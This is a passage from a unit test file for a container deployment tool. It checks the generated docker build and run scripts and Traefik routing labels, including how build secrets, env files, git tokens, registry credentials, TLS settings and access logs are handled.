    expect(s).toContain(`printf %s '${Buffer.from("npm_s3cr3t").toString("base64")}' | base64 -d > "$sd/bs_NPM_TOKEN"`);
    expect(s).toContain('chmod 600 "$sd/bs_NPM_TOKEN"');
    expect(s).toContain("trap 'rm -rf $TUGRA_SEC_DIRS' EXIT INT TERM HUP"); // the secrets dir is wiped with the script
    // a SIGKILLed run (timeout/cancel) can't run its trap: every run sweeps stale dirs first, age-gated past any live build
    const sweepIdx = s.indexOf("find /etc/tugra/builds -maxdepth 1 -type d -name '.sec.*' -mmin +1440 -exec rm -rf {} +");
    expect(sweepIdx).toBeGreaterThan(-1);
    expect(sweepIdx).toBeLessThan(s.indexOf("sd=$(mktemp -d /etc/tugra/builds/.sec.XXXXXX)"));
    // the secret files die right after the build, before push/health/soak (order: files written → build → rm)
    const lines = s.split("\n");
    const wrote = lines.findIndex((l) => l.includes('> "$sd/bs_NPM_TOKEN"'));
    const built = lines.findIndex((l) => l.startsWith("DOCKER_BUILDKIT=1 docker build "));
    const shredded = lines.findIndex((l) => l === 'rm -f "$sd"/bs_*');
    expect(wrote).toBeGreaterThan(-1);
    expect(wrote).toBeLessThan(built);
    expect(built).toBeLessThan(shredded);
    expect(s).not.toContain("npm_s3cr3t"); // plaintext never in the script text
    expect(s).not.toContain("--build-arg 'NPM_TOKEN"); // a secret is never also a (history-visible) build arg
    expect(s).not.toContain("bad-key"); // a non-identifier id is dropped, never interpolated into the command
    // a build without secrets is byte-identical to before (no BuildKit prefix, no secrets dir)
    const plain = buildRunScript({ ...git, buildSecrets: {} }, "v1");
    expect(plain).not.toContain("DOCKER_BUILDKIT");
    expect(plain).not.toContain("--secret");
    // non-Dockerfile builders have no mount contract → the secrets are ignored (never --env'd into the image)
    const nix = buildRunScript({ ...git, buildType: "NIXPACKS" }, "v1");
    expect(nix).not.toContain("--secret");
    expect(nix).not.toContain("npm_s3cr3t");
    expect(nix).toContain("TUGRA: 1 build secret(s) are set but this build pack cannot mount them"); // said in the build log, never silent
    // the build-server variant shares the same steps, so secrets reach a separate build server too
    const buildOnly = buildBuildOnlyScript(git, "v1");
    expect(buildOnly).toContain('--secret id=NPM_TOKEN,src="$sd/bs_NPM_TOKEN" ');
    expect(buildOnly).not.toContain("npm_s3cr3t");
  });

  it("adds no build-arg/env flags when there are no build args", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "DOCKERFILE" }, "v1");
    expect(s).not.toContain("--build-arg");
    expect(s).not.toContain("--env ");
  });

  it("appends custom docker options as shell-quoted argv (not verbatim — injection guard)", () => {
    const s = buildRunScript({ ...base, dockerOptions: "--cap-add=NET_ADMIN --dns 1.1.1.1" }, "v1");
    expect(s).toContain("'--cap-add=NET_ADMIN' '--dns' '1.1.1.1'");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped");
  });

  it("adds nothing when docker options are unset", () => {
    const s = buildRunScript({ ...base }, "v1");
    expect(s).not.toContain("--cap-add");
    expect(s).not.toContain("--dns");
  });

  it("injects env via an --env-file (0600) instead of -e, plus -p when no domain", () => {
    const s = buildRunScript({ ...base, env: { FOO: "bar baz" }, hostPort: 8080, containerPort: 3000 }, "v1");
    expect(s).toContain("--env-file /etc/tugra/env/abc.env");
    expect(s).toContain("base64 -d > /etc/tugra/env/abc.env");
    expect(s).toContain("chmod 600 /etc/tugra/env/abc.env");
    expect(s).not.toContain("-e 'FOO"); // secrets not on the command line
    expect(s).toContain("-p 8080:3000");
    expect(s).not.toContain("tugra-proxy");
    const m = s.match(/printf %s '([A-Za-z0-9+/=]+)'/);
    expect(m).toBeTruthy();
    expect(Buffer.from(m![1], "base64").toString()).toBe("FOO=bar baz");
  });

  it("adds resource limits + health-check flags when set", () => {
    const s = buildRunScript(
      { ...base, memoryMb: 512, cpus: 0.5, healthCmd: "curl -fsS http://localhost:80/ || exit 1" },
      "v1",
    );
    expect(s).toContain("--memory 512m");
    expect(s).toContain("--cpus 0.5");
    expect(s).toContain("--health-cmd 'curl -fsS http://localhost:80/ || exit 1'");
    expect(s).toContain("--health-interval=10s");
    expect(s).toContain("--health-start-period=30s");
  });

  it("passes --gpus (shell-quoted) when set, and omits it otherwise", () => {
    expect(buildRunScript({ ...base, gpus: "all" }, "v1")).toContain("--gpus 'all'");
    expect(buildRunScript({ ...base, gpus: "device=0,1" }, "v1")).toContain("--gpus 'device=0,1'");
    expect(buildRunScript(base, "v1")).not.toContain("--gpus");
  });

  it("mounts persistent volumes via -v before the image reference", () => {
    const s = buildRunScript(
      { ...base, volumes: [{ name: "data", path: "/app/data" }, { name: "logs", path: "/var/log/app" }] },
      "v1",
    );
    expect(s).toContain("-v tugra_appv_abc_data:/app/data");
    expect(s).toContain("-v tugra_appv_abc_logs:/var/log/app");
    // volume flags precede the image reference in the run command
    expect(s.indexOf("-v tugra_appv_abc_data")).toBeLessThan(s.indexOf("'tugra_abc:v1'"));
  });

  it("omits -v when no volumes are configured (regression)", () => {
    expect(buildRunScript(base, "v1")).not.toContain("-v tugra_appv");
  });

  it("removing an app drops its named volumes too", () => {
    const s = buildRemoveScript({ id: "abc" }, [{ name: "data", path: "/app/data" }]);
    expect(s).toContain("docker rm -f tugra_abc");
    expect(s).toContain("docker volume rm tugra_appv_abc_data");
  });

  it("removing an app also reclaims its leftover build working tree", () => {
    expect(buildRemoveScript({ id: "abc" })).toContain("rm -rf /etc/tugra/builds/abc /etc/tugra/builds/abc.plan.json");
  });

  it("a GIT build reclaims the clone dir after the image is built", () => {
    const s = buildRunScript({ ...base, source: "GIT", gitUrl: "https://x/y.git", buildType: "DOCKERFILE" }, "v1");
    const buildIdx = s.indexOf("docker build");
    // The clone-prep at the start also `rm -rf`s the dir, so the POST-build cleanup is the LAST occurrence.
    const rmIdx = s.lastIndexOf("rm -rf /etc/tugra/builds/abc");
    expect(buildIdx).toBeGreaterThanOrEqual(0);
    expect(rmIdx).toBeGreaterThan(buildIdx); // cleanup runs after the build, not before
  });

  it("gitAuthUrl injects x-access-token into https URLs only", () => {
    expect(gitAuthUrl("https://github.com/x/y.git")).toBe("https://x-access-token@github.com/x/y.git");
    expect(gitAuthUrl("git@github.com:x/y.git")).toBe("git@github.com:x/y.git");
  });

  it("GIT private clone uses GIT_ASKPASS and never puts the raw token in the command", () => {
    const s = buildRunScript(
      { ...base, source: "GIT", image: null, gitUrl: "https://github.com/x/y.git", gitBranch: "main", gitToken: "secret123" },
      "v1",
    );
    expect(s).toContain("GIT_ASKPASS=");
    expect(s).toContain("GIT_TERMINAL_PROMPT=0");
    expect(s).toContain("x-access-token@github.com");
    expect(s).toContain('trap');
    expect(s).not.toContain("secret123"); // raw token only travels base64-encoded
  });

  it("GIT clone without a token keeps the plain command (regression)", () => {
    const s = buildRunScript(
      { ...base, source: "GIT", image: null, gitUrl: "https://github.com/x/y.git" },
      "v1",
    );
    expect(s).not.toContain("GIT_ASKPASS");
    expect(s).toContain("git clone --depth 1 --branch 'main' -- 'https://github.com/x/y.git'");
  });

  it("IMAGE pull authenticates to a private registry via --password-stdin (no raw token)", () => {
    const s = buildRunScript(
      { ...base, registryAuth: { url: "reg.io", user: "u", token: "secret123" } },
      "v1",
    );
    expect(s).toContain("--password-stdin");
    expect(s).toContain('docker --config "$sd" login');
    expect(s).toContain("reg.io");
    expect(s).toContain("-u 'u'");
    expect(s).toContain("logout");
    expect(s).not.toContain("--password "); // never the inline flag
    expect(s).not.toContain("secret123");
  });

  it("IMAGE pull without registry auth stays unauthenticated (regression)", () => {
    const s = buildRunScript(base, "v1");
    expect(s).not.toContain("docker login");
    expect(s).not.toContain("DOCKER_CONFIG");
  });

  it("omits limit/health flags when unset (regression)", () => {
    const s = buildRunScript(base, "v1");
    expect(s).not.toContain("--memory");
    expect(s).not.toContain("--cpus");
    expect(s).not.toContain("--health-cmd");
  });

  it("publishes extra ports (TCP + UDP) as additional -p flags; byte-identical when none", () => {
    const s = buildRunScript({ ...base, extraPorts: [{ hostPort: 9090, containerPort: 9090, protocol: "tcp" }, { hostPort: 5353, containerPort: 53, protocol: "udp" }] }, "v1");
    expect(s).toContain("-p 9090:9090");
    expect(s).toContain("-p 5353:53/udp");
    // no extra ports → byte-identical to the plain run
    expect(buildRunScript({ ...base, extraPorts: [] }, "v1")).toBe(buildRunScript(base, "v1"));
  });

  it("writes no env-file when there are no env vars", () => {
    const s = buildRunScript({ ...base, hostPort: 8080 }, "v1");
    expect(s).not.toContain("--env-file");
    expect(s).not.toContain("/etc/tugra/env");
  });

  it("envFileContent / envFileB64 round-trip", () => {
    expect(envFileContent({ A: "1", B: "two" })).toBe("A=1\nB=two");
    expect(Buffer.from(envFileB64({ A: "1" }), "base64").toString()).toBe("A=1");
  });

  it("with a domain, joins the proxy network + Traefik labels, no -p", () => {
    const s = buildRunScript({ ...base, domain: "app.example.com", hostPort: 8080 }, "v1");
    expect(s).toContain("--network tugra-proxy");
    expect(s).toContain("traefik.enable=true");
    expect(s).toContain("Host(`app.example.com`)");
    expect(s).toContain("certresolver=le");
    expect(s).not.toContain("-p 8080");
  });

  it("traefikLabels is empty without a domain", () => {
    expect(traefikLabels(base)).toEqual([]);
    expect(traefikLabels({ ...base, domain: "x.com" }).length).toBeGreaterThan(0);
  });

  it("certType http (magic) serves plain HTTP on :80 — no TLS, no LE, no redirect", () => {
    const s = traefikLabels({ ...base, domain: "app-x.1-2-3-4.sslip.io", certType: "http" }).join("\n");
    expect(s).toContain("Host(`app-x.1-2-3-4.sslip.io`)");
    expect(s).toContain(`routers.tugra_${base.id}.entrypoints=web`);
    expect(s).not.toContain("websecure");
    expect(s).not.toContain("certresolver");
    expect(s).not.toContain("redirectscheme");
    expect(s).not.toContain(`routers.tugra_${base.id}-web.`); // no separate redirect router
  });

  it("certType none is also plain HTTP", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "none" }).join("\n");
    expect(s).toContain("entrypoints=web");
    expect(s).not.toContain("certresolver");
  });

  it("certType le-http keeps HTTPS + LE + the :80→:443 redirect (custom-domain parity)", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "le-http" }).join("\n");
    expect(s).toContain("entrypoints=websecure");
    expect(s).toContain("certresolver=le");
    expect(s).toContain("redirectscheme.scheme=https");
  });

  it("an unset certType defaults to HTTPS (no silent downgrade of existing apps)", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).toContain("certresolver=le");
    expect(s).toContain("entrypoints=websecure");
  });

  it("certType le-dns uses the le-dns resolver + a wildcard cert for the server domain", () => {
    const s = traefikLabels({
      ...base,
      domain: "app-x.apps.example.com",
      certType: "le-dns",
      wildcardDomain: "apps.example.com",
    }).join("\n");
    expect(s).toContain("tls.certresolver=le-dns");
    expect(s).toContain("tls.domains[0].main=*.apps.example.com");
    expect(s).toContain("tls.domains[0].sans=apps.example.com");
    expect(s).toContain("entrypoints=websecure");
  });

  it("certType custom uses the operator's resolver name", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "custom", customCertResolver: "myresolver" }).join("\n");
    expect(s).toContain("tls.certresolver=myresolver");
    expect(s).not.toContain("tls.domains"); // wildcard only for le-dns
  });

  it("a magic (http) domain still joins the proxy network with no published port", () => {
    const s = buildRunScript({ ...base, domain: "app-x.1-2-3-4.sslip.io", certType: "http", hostPort: 8080 }, "v1");
    expect(s).toContain("--network tugra-proxy");
    expect(s).toContain("Host(`app-x.1-2-3-4.sslip.io`)");
    expect(s).not.toContain("-p 8080");
    expect(s).not.toContain("certresolver");
  });

  it("http-only canonical redirect uses the http scheme", () => {
    const s = traefikLabels({ ...base, domain: "x.com", certType: "http", domainRedirect: "root" }).join("\n");
    expect(s).toContain("redirectregex.regex=^http://www\\.x\\.com/(.*)");
    expect(s).toContain("redirectregex.replacement=http://x.com/${1}");
  });

  it("plain domain has no canon/sec middleware (regression)", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).toContain("Host(`x.com`)");
    expect(s).not.toContain("-canon");
    expect(s).not.toContain("-sec");
  });

  it("root redirect routes bare+www and redirects www→bare", () => {
    const s = traefikLabels({ ...base, domain: "x.com", domainRedirect: "root" }).join("\n");
    expect(s).toContain("Host(`x.com`) || Host(`www.x.com`)");
    expect(s).toContain("redirectregex.regex=^https://www\\.x\\.com/(.*)");
    expect(s).toContain("redirectregex.replacement=https://x.com/${1}");
    expect(s).toContain("redirectregex.permanent=true");
    expect(s).toContain(`middlewares=tugra_${base.id}-canon`);
  });

  it("www redirect redirects bare→www", () => {
    const s = traefikLabels({ ...base, domain: "x.com", domainRedirect: "www" }).join("\n");
    expect(s).toContain("redirectregex.regex=^https://x\\.com/(.*)");
    expect(s).toContain("redirectregex.replacement=https://www.x.com/${1}");
  });

  it("path prefix adds a PathPrefix rule + a stripprefix middleware (stripped by default)", () => {
    const s = traefikLabels({ ...base, domain: "x.com", pathPrefix: "/api" }).join("\n");
    expect(s).toContain("Host(`x.com`) && PathPrefix(`/api`)");
    expect(s).toContain(`middlewares.tugra_${base.id}-strip.stripprefix.prefixes=/api`);
    expect(s).toContain(`middlewares=tugra_${base.id}-strip`);
  });

  it("path prefix wraps a www-canonical OR in parens", () => {
    const s = traefikLabels({ ...base, domain: "x.com", domainRedirect: "root", pathPrefix: "/api" }).join("\n");
    expect(s).toContain("(Host(`x.com`) || Host(`www.x.com`)) && PathPrefix(`/api`)");
  });

  it("stripPrefix:false keeps the PathPrefix rule but emits no strip middleware", () => {
    const s = traefikLabels({ ...base, domain: "x.com", pathPrefix: "/api", stripPrefix: false }).join("\n");
    expect(s).toContain("PathPrefix(`/api`)");
    expect(s).not.toContain("-strip");
  });

  it("no path prefix → byte-identical rule (regression)", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).toContain("routers.tugra_" + base.id + ".rule=Host(`x.com`)");
    expect(s).not.toContain("PathPrefix");
    expect(s).not.toContain("-strip");
  });

  it("rate limit emits a ratelimit middleware, placed after the IP gate + before auth", () => {
    const s = traefikLabels({
      ...base,
      domain: "x.com",
      ipAllowlist: ["10.0.0.0/8"],
      basicAuthUsers: [{ user: "u", hash: "$2b$x" }],
      rateLimit: { average: 100, burst: 50, period: "1m" },
    }).join("\n");
    expect(s).toContain(`middlewares.tugra_${base.id}-rl.ratelimit.average=100`);
    expect(s).toContain(`middlewares.tugra_${base.id}-rl.ratelimit.burst=50`);
    expect(s).toContain(`middlewares.tugra_${base.id}-rl.ratelimit.period=1m`);
    // chain order: ip -> rl -> ba
    expect(s).toContain(`routers.tugra_${base.id}.middlewares=tugra_${base.id}-ip,tugra_${base.id}-rl,tugra_${base.id}-ba`);
  });

  it("no rate limit → no ratelimit middleware (regression)", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).not.toContain("-rl");
    expect(s).not.toContain("ratelimit");
  });

  it("security headers add a headers middleware to the router", () => {
    const s = traefikLabels({ ...base, domain: "x.com", securityHeaders: true }).join("\n");
    expect(s).toContain("-sec.headers.stsSeconds=31536000");
    expect(s).toContain("-sec.headers.frameDeny=true");
    expect(s).toContain(`middlewares=tugra_${base.id}-sec`);
  });

  it("gzip adds a compress middleware to the router (and is absent when off)", () => {
    const on = traefikLabels({ ...base, domain: "x.com", gzip: true }).join("\n");
    expect(on).toContain(`middlewares.tugra_${base.id}-compress.compress=true`);
    const chain = traefikLabels({ ...base, domain: "x.com", gzip: true }).find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-compress`);
    const off = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(off).not.toContain("-compress");
  });

  it("forward-auth adds a forwardauth middleware first in the chain", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", securityHeaders: true, forwardAuth: "https://auth.x/verify" });
    const s = labels.join("\n");
    expect(s).toContain(`-fa.forwardauth.address=https://auth.x/verify`);
    expect(s).toContain("-fa.forwardauth.trustForwardHeader=true");
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-fa`);
    expect(chain.indexOf("-fa")).toBeLessThan(chain.indexOf("-sec")); // auth runs first
  });

  it("no forwardauth label without forwardAuth", () => {
    const s = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(s).not.toContain("forwardauth");
  });

  it("basic-auth adds a basicauth middleware; compose path escapes the bcrypt $ to $$, classic does not", () => {
    const users = [{ user: "admin", hash: "$2b$10$abcDEF" }];
    const classic = traefikLabels({ ...base, domain: "x.com", basicAuthUsers: users }).join("\n");
    expect(classic).toContain(`-ba.basicauth.users=admin:$2b$10$abcDEF`); // literal $ (docker-run label is single-quoted)
    const compose = traefikLabels({ ...base, domain: "x.com", basicAuthUsers: users }, { composeDollarEscape: true }).join("\n");
    expect(compose).toContain(`-ba.basicauth.users=admin:$$2b$$10$$abcDEF`); // $ doubled for compose interpolation
  });

  it("basic-auth runs before forward-auth but after the ip-allowlist filter", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", forwardAuth: "https://a/v", ipAllowlist: ["10.0.0.0/8"], basicAuthUsers: [{ user: "u", hash: "$2b$h" }] });
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain.indexOf("-ip")).toBeLessThan(chain.indexOf("-ba"));
    expect(chain.indexOf("-ba")).toBeLessThan(chain.indexOf("-fa"));
  });

  it("no basicauth label when there are no users (byte-identical)", () => {
    const withEmpty = traefikLabels({ ...base, domain: "x.com", basicAuthUsers: [] }).join("\n");
    expect(withEmpty).toBe(traefikLabels({ ...base, domain: "x.com" }).join("\n"));
    expect(withEmpty).not.toContain("basicauth");
  });

  it("ip-allowlist adds an ipallowlist middleware FIRST in the chain (before auth)", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", securityHeaders: true, forwardAuth: "https://a/v", ipAllowlist: ["10.0.0.0/8", "1.2.3.4"] });
    const s = labels.join("\n");
    expect(s).toContain(`-ip.ipallowlist.sourcerange=10.0.0.0/8,1.2.3.4`);
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-ip`);
    expect(chain.indexOf("-ip")).toBeLessThan(chain.indexOf("-fa")); // IP filter runs before auth
  });

  it("no ipallowlist label when the allowlist is empty (byte-identical)", () => {
    const withEmpty = traefikLabels({ ...base, domain: "x.com", ipAllowlist: [] }).join("\n");
    const without = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(withEmpty).toBe(without);
    expect(withEmpty).not.toContain("ipallowlist");
  });

  it("custom redirects add one redirectregex middleware each, in order, with 301/302 from permanent", () => {
    const labels = traefikLabels({
      ...base,
      domain: "x.com",
      redirects: [
        { regex: "^https://x\\.com/old/(.*)", replacement: "https://x.com/new/${1}", permanent: true },
        { regex: "^https://x\\.com/legacy", replacement: "https://x.com/", permanent: false },
      ],
    });
    const s = labels.join("\n");
    expect(s).toContain(`-rd0.redirectregex.regex=^https://x\\.com/old/(.*)`);
    expect(s).toContain(`-rd0.redirectregex.replacement=https://x.com/new/${"${1}"}`); // literal ${1} (docker-run label is single-quoted)
    expect(s).toContain(`-rd0.redirectregex.permanent=true`);
    expect(s).toContain(`-rd1.redirectregex.permanent=false`);
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain.indexOf("-rd0")).toBeLessThan(chain.indexOf("-rd1")); // user order preserved
  });

  it("redirects run after the canonical redirect and the auth gate, before security headers", () => {
    const labels = traefikLabels({
      ...base,
      domain: "x.com",
      domainRedirect: "root",
      securityHeaders: true,
      basicAuthUsers: [{ user: "u", hash: "$2b$h" }],
      redirects: [{ regex: "^https://x\\.com/a", replacement: "https://x.com/b", permanent: true }],
    });
    const chain = labels.find((l) => l.includes(`routers.tugra_${base.id}.middlewares=`))!;
    expect(chain.indexOf("-ba")).toBeLessThan(chain.indexOf("-canon")); // auth before any redirect
    expect(chain.indexOf("-canon")).toBeLessThan(chain.indexOf("-rd0")); // canonical before custom
    expect(chain.indexOf("-rd0")).toBeLessThan(chain.indexOf("-sec")); // redirects before headers
  });

  it("redirects double every $ on the compose path (end-anchor + capture ref survive interpolation)", () => {
    const spec = { ...base, domain: "x.com", redirects: [{ regex: "^https://x\\.com/old$", replacement: "https://x.com/new/${1}", permanent: true }] };
    const classic = traefikLabels(spec).join("\n");
    expect(classic).toContain(`-rd0.redirectregex.regex=^https://x\\.com/old$`); // literal $ end-anchor
    expect(classic).toContain(`-rd0.redirectregex.replacement=https://x.com/new/${"${1}"}`); // literal ${1}
    const compose = traefikLabels(spec, { composeDollarEscape: true }).join("\n");
    expect(compose).toContain(`-rd0.redirectregex.regex=^https://x\\.com/old$$`); // $ doubled for compose
    expect(compose).toContain(`-rd0.redirectregex.replacement=https://x.com/new/$${"${1}"}`); // $${1}
  });

  it("no redirectregex rule label when there are no redirects (byte-identical)", () => {
    const withEmpty = traefikLabels({ ...base, domain: "x.com", redirects: [] }).join("\n");
    const without = traefikLabels({ ...base, domain: "x.com" }).join("\n");
    expect(withEmpty).toBe(without);
    expect(withEmpty).not.toContain("-rd0");
  });

  it("aliases inherit the ip-allowlist middleware", () => {
    const labels = traefikLabels({ ...base, domain: "x.com", ipAllowlist: ["10.0.0.0/8"], extraDomains: ["b.com"] });
    const x = extraRouterName(`tugra_${base.id}`, "b.com");
    const chain = labels.find((l) => l.includes(`routers.${x}.middlewares=`))!;
    expect(chain).toContain(`tugra_${base.id}-ip`);
  });

  describe("multi-domain aliases (extraDomains)", () => {
    const R = `tugra_${base.id}`;

    it("no extras is byte-identical to today ([] and undefined produce the same labels)", () => {
      for (const spec of [
        { ...base, domain: "x.com" },
        { ...base, domain: "x.com", certType: "le-dns", wildcardDomain: "apps.example.com" },
        { ...base, domain: "x.com", certType: "custom", certPem: "P", certKey: "K" },
        { ...base, domain: "x.com", domainRedirect: "root" as const, securityHeaders: true, forwardAuth: "https://a/v" },
        { ...base, domain: "app-x.1-2-3-4.sslip.io", certType: "http" },
      ]) {
        const baseline = traefikLabels(spec);
        expect(traefikLabels({ ...spec, extraDomains: [] })).toEqual(baseline);
        expect(traefikLabels({ ...spec, extraDomains: undefined })).toEqual(baseline);
      }
    });

    it("one alias adds its own HTTPS router (+ redirect twin) targeting the primary service", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", certType: "le-http", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const s = labels.join("\n");
      expect(s).toContain(`routers.${x}.rule=Host(\`b.com\`)`);
      expect(s).toContain(`routers.${x}.entrypoints=websecure`);
      expect(s).toContain(`routers.${x}.service=${R}`);
      expect(s).toContain(`routers.${x}.tls.certresolver=le`);
      expect(s).toContain(`routers.${x}-web.rule=Host(\`b.com\`)`);
      expect(s).toContain(`routers.${x}-web.middlewares=${R}-redirect`);
    });

    it("alias router names are hashed, distinct, stable under reordering, and never collide with the primary's suffixes", () => {
      const a = extraRouterName(R, "b.com");
      const b = extraRouterName(R, "c.com");
      expect(a).not.toBe(b);
      expect(extraRouterName(R, "B.COM")).toBe(a); // case-insensitive, order-independent
      for (const suf of ["-web", "-redirect", "-canon", "-sec", "-fa"]) expect(a.endsWith(suf)).toBe(false);
      const l1 = traefikLabels({ ...base, domain: "x.com", extraDomains: ["b.com", "c.com"] });
      const l2 = traefikLabels({ ...base, domain: "x.com", extraDomains: ["c.com", "b.com"] });
      const routers = (ls: string[]) => ls.filter((l) => l.includes(".rule=")).sort();
      expect(routers(l1)).toEqual(routers(l2)); // reordering doesn't rename routers
    });

    it("a plain-HTTP (magic) primary still serves aliases over HTTPS and defines the redirect middleware once", () => {
      const labels = traefikLabels({ ...base, domain: "app-x.sslip.io", certType: "http", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const s = labels.join("\n");
      expect(s).toContain(`routers.${x}.entrypoints=websecure`);
      expect(s).toContain(`routers.${x}.tls.certresolver=le`);
      expect(labels.filter((l) => l.includes("-redirect.redirectscheme.scheme=https"))).toHaveLength(1);
      expect(s).toContain(`routers.${R}.entrypoints=web`); // primary stays plain HTTP
    });

    it("an le-dns primary's alias uses HTTP-01 (le), never the wildcard", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", certType: "le-dns", wildcardDomain: "apps.example.com", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      expect(labels.join("\n")).toContain(`routers.${x}.tls.certresolver=le`);
      expect(labels.some((l) => l.startsWith(`traefik.http.routers.${x}.tls.domains`))).toBe(false);
    });

    it("an uploaded-cert primary's alias gets tls=true (SNI, no resolver)", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", certType: "custom", certPem: "P", certKey: "K", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const s = labels.join("\n");
      expect(s).toContain(`routers.${x}.tls=true`);
      expect(s).not.toContain(`routers.${x}.tls.certresolver`);
    });

    it("aliases reuse the fa+sec chain but never the canonical redirect", () => {
      const labels = traefikLabels({ ...base, domain: "x.com", domainRedirect: "root", securityHeaders: true, forwardAuth: "https://a/v", extraDomains: ["b.com"] });
      const x = extraRouterName(R, "b.com");
      const chain = labels.find((l) => l.includes(`routers.${x}.middlewares=`))!;
      expect(chain).toBe(`traefik.http.routers.${x}.middlewares=${R}-fa,${R}-sec`);
      expect(chain).not.toContain("-canon");
    });
  });

  it("proxy setup script runs Traefik with the HTTP-01 resolver by default (no DNS resolver)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com" });
    expect(s).toContain("docker network create tugra-proxy");
    expect(s).toContain(PROXY_IMAGE);
    expect(s).toContain("acme.email='me@x.com'");
    expect(s).toContain("certificatesresolvers.le.acme.httpchallenge=true");
    // no phone-home: Traefik's upstream version check + anonymous usage report are off
    expect(s).toContain("--global.checknewversion=false");
    expect(s).toContain("--global.sendanonymoususage=false");
    // no DNS-01 resolver / creds when the server has none
    expect(s).not.toContain("le-dns");
    expect(s).not.toContain("--env-file");
    expect(s).not.toContain("acme-dns.json");
  });

  it("accessLog ON: bind-mounts the host log dir, enables the minimal JSON access log, and mkdirs the dir BEFORE docker run", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", accessLog: true });
    expect(s).toContain("-v /etc/tugra/proxy-logs:/var/log/traefik");
    expect(s).toContain("--accesslog=true");
    expect(s).toContain("--accesslog.format=json");
    expect(s).toContain("--accesslog.filepath=/var/log/traefik/access.json");
    expect(s).toContain("--accesslog.fields.defaultmode=drop");
    // query strings are a separate Traefik switch (default KEEP) — must be dropped so RequestPath has no `?token=`
    expect(s).toContain("--accesslog.fields.queryparameters.defaultmode=drop");
    const kept = ["ClientHost", "RequestHost", "RequestPath", "RequestMethod", "DownstreamStatus", "DownstreamContentSize", "Duration", "StartUTC", "RouterName", "EntryPointName"];
    for (const f of kept) expect(s).toContain(`--accesslog.fields.names.${f}=keep`);
    // exactly the allow-list; headers: default drop, only User-Agent + Referer kept (processed locally by the agent)
    expect(s.match(/--accesslog\.fields\.names\.\w+=keep/g)).toHaveLength(kept.length);
    expect(s).toContain("--accesslog.fields.headers.defaultmode=drop");
    expect(s).toContain("--accesslog.fields.headers.names.User-Agent=keep");
    expect(s).toContain("--accesslog.fields.headers.names.Referer=keep");
    expect(s.match(/--accesslog\.fields\.headers\.names\.[\w-]+=keep/g)).toHaveLength(2);
    expect(s).not.toMatch(/headers\.names\.(Cookie|Authorization)/i);
    expect(s.indexOf("mkdir -p /etc/tugra/proxy-logs")).toBeGreaterThan(-1);
    expect(s.indexOf("mkdir -p /etc/tugra/proxy-logs")).toBeLessThan(s.indexOf("docker run -d"));
  });

  it("accessLog ON: installs a size-bounded logrotate drop-in (copytruncate); OFF cleanup removes log + config", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", accessLog: true });
    expect(s).toContain("/etc/logrotate.d/tugra-proxy-access");
    expect(s).toContain("copytruncate");
    expect(s).toContain("size 50M");
    expect(s).toContain("rotate 3");
    expect(s.indexOf("logrotate")).toBeLessThan(s.indexOf("docker run -d"));
    const c = buildProxyAccessLogCleanupScript();
    expect(c).toContain("/etc/tugra/proxy-logs/access.json");
    expect(c).toContain("/etc/logrotate.d/tugra-proxy-access");
  });

  it("accessLog ON: the access-log dir/file are locked down to root (0700/0600) BEFORE the proxy starts (raw UA/Referer on disk)", () => {
    const s = buildProxySetupScript({ acmeEmail: "me@x.com", accessLog: true });
    const run = s.indexOf("docker run -d");
    for (const step of [
      "chmod 700 /etc/tugra/proxy-logs",
      "touch /etc/tugra/proxy-logs/access.json && chmod 600 /etc/tugra/proxy-logs/access.json",
      "chmod 600 /etc/tugra/proxy-logs/access.json.*",
    ]) {
      expect(s).toContain(step);
      expect(s.indexOf(step)).toBeLessThan(run);
    }
    expect(s.indexOf("mkdir -p /etc/tugra/proxy-logs")).toBeLessThan(s.indexOf("chmod 700 /etc/tugra/proxy-logs"));
  });

  it("accessLog OFF/undefined: NO access-log flag, mount or mkdir (default script unchanged)", () => {
    const def = buildProxySetupScript({ acmeEmail: "me@x.com" });
    for (const s of [def, buildProxySetupScript({ acmeEmail: "me@x.com", accessLog: false })]) {
      expect(s).not.toContain("accesslog");
      expect(s).not.toContain("proxy-logs");
      expect(s).not.toContain("/var/log/traefik");
    }
    expect(buildProxySetupScript({ acmeEmail: "me@x.com", accessLog: false })).toBe(def);
  });

  it("adds a DNS-01 wildcard resolver and passes creds via a 0600 --env-file (never -e)", () => {
    const s = buildProxySetupScript({
      acmeEmail: "me@x.com",
      dnsProvider: "cloudflare",
      dnsCreds: { CF_DNS_API_TOKEN: "s3cr3t-token" },
    });
    expect(s).toContain("--certificatesresolvers.le-dns.acme.dnschallenge=true");
